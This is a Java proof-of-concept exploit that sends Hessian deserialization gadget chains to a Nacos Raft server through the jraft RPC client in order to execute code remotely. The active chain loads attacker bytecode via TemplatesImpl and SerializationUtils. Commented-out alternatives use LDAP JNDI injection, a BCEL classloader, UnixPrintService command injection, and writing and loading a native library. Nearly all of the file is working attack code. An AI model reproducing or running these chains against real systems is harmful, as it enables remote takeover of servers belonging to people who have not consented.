package com.example;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;
import com.alipay.sofa.jraft.CliService;
import com.alipay.sofa.jraft.RaftServiceFactory;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.fasterxml.jackson.databind.node.POJONode;
import com.google.protobuf.ByteString;
import com.google.protobuf.Message;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.util.SerializationUtils;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.management.BadAttributeValueExpException;
import javax.swing.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class Demo {

    public static void main(String[] args) throws Exception {

        RouteTable rt = RouteTable.getInstance();
        Configuration conf = new Configuration();

        // 目标 nacos Raft Server
        PeerId peerId = new PeerId();
        peerId.parse("127.0.0.1:7848");

        String groupId = "naming_persistent_service_v2";

        conf.addPeer(peerId);

        // 初始化 CliService 和 CliClientService 客户端
        CliService cliService =  RaftServiceFactory.createAndInitCliService(new CliOptions());
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());

        // 刷新路由表
        rt.updateConfiguration(groupId, conf);

        rt.refreshLeader(cliClientService, groupId, 1000).isOk();

        Field parserClassesField = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClassesField.setAccessible(true);

        ConcurrentHashMap parserClasses = (ConcurrentHashMap) parserClassesField.get(cliClientService.getRpcClient());
        parserClasses.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());

        Field messagesField = MarshallerHelper.class.getDeclaredField("messages");
        messagesField.setAccessible(true);

        Map<String, Message> messages = (Map<String, Message>) messagesField.get(MarshallerHelper.class);
        messages.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());

        // 1. ldap JNDI 注入
//        SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{"ldap://127.0.0.1:1389/xx"});
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("aaa", swingLazyValue);
//        u2.put("aaa", swingLazyValue);
//
//        HashMap map = HashColl.makeMap(u1, u2);


        // 2. BCEL ClassLoader, 限制版本 < 8u251
//        JavaClass clazz = Repository.lookupClass(Evil.class);
//        String payload = "$$BCEL$$" + Utility.encode(clazz.getBytes(), true);
//
//        SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper","_main",new Object[]{new String[]{payload}});
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("aaa", swingLazyValue);
//        u2.put("aaa", swingLazyValue);
//
//        HashMap map = HashColl.makeMap(u1, u2);


        // 3. UnixPrintService 命令注入
//        Constructor constructor = UnixPrintService.class.getDeclaredConstructor(String.class);
//        constructor.setAccessible(true);
//        UnixPrintService unixPrintService = (UnixPrintService) constructor.newInstance(";open -a Calculator");
//
//        POJONode pojoNode = new POJONode(unixPrintService);
//
////        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
////        Method exec = String.class.getDeclaredMethod("valueOf", Object.class);
////        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, new String("123"), new Object[]{pojoNode}}});
//        UIDefaults.ProxyLazyValue swingLazyValue = new UIDefaults.ProxyLazyValue("java.lang.String", "valueOf", new Object[]{pojoNode});
//
//        Field accField = UIDefaults.ProxyLazyValue.class.getDeclaredField("acc");
//        accField.setAccessible(true);
//        accField.set(swingLazyValue, null);
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("aaa", swingLazyValue);
//        u2.put("aaa", swingLazyValue);
//
//        HashMap map = HashColl.makeMap(u1, u2);


        // 4. writeBytesToFilename + System.load
//        byte[] content = Files.readAllBytes(Paths.get("/Users/exp10it/exp.dylib"));
//        SwingLazyValue swingLazyValue1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"/tmp/exp.dylib", content});
//        SwingLazyValue swingLazyValue2 = new SwingLazyValue("java.lang.System", "load", new Object[]{"/tmp/exp.dylib"});
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("aaa", swingLazyValue1);
//        u2.put("aaa", swingLazyValue1);
//
//        HashMap map1 = HashColl.makeMap(u1, u2);
//
//        UIDefaults u3 = new UIDefaults();
//        UIDefaults u4 = new UIDefaults();
//        u3.put("bbb", swingLazyValue2);
//        u4.put("bbb", swingLazyValue2);
//
//        HashMap map2 = HashColl.makeMap(u3, u4);
//
//        HashMap map = new HashMap();
//        map.put(1, map1);
//        map.put(2, map2);


        // 5. SerializationUtils 二次反序列化
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(TemplatesEvilClass.class.getName());

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        POJONode pojoNode = new POJONode(templatesImpl);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
        Reflection.setFieldValue(poc, "val", pojoNode);

        byte[] data = Serialization.serialize(poc);

//        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
//        Method m = SerializationUtils.class.getDeclaredMethod("deserialize", byte[].class);
//        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{m, null, new Object[]{data}}});
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("aaa", swingLazyValue);
//        u2.put("aaa", swingLazyValue);

        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue(SerializationUtils.class.getName(), "deserialize", new Object[]{data});

        Field accField = UIDefaults.ProxyLazyValue.class.getDeclaredField("acc");
        accField.setAccessible(true);
        accField.set(proxyLazyValue, null);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", proxyLazyValue);
        u2.put("aaa", proxyLazyValue);

        HashMap map = HashColl.makeMap(u1, u2);


        // 防止反序列化类型转换报错, 实现多次利用
        MetadataOperation<HashMap> metadataOperation = new MetadataOperation<>();
        metadataOperation.setMetadata(map);
        byte[] payload = Serialization.hessian2Serialize(metadataOperation);

        WriteRequest writeRequest = WriteRequest.newBuilder().setGroup(groupId).setData(ByteString.copyFrom(payload)).build();
        cliClientService.getRpcClient().invokeSync(peerId.getEndpoint(), writeRequest, 5000);
    }
}
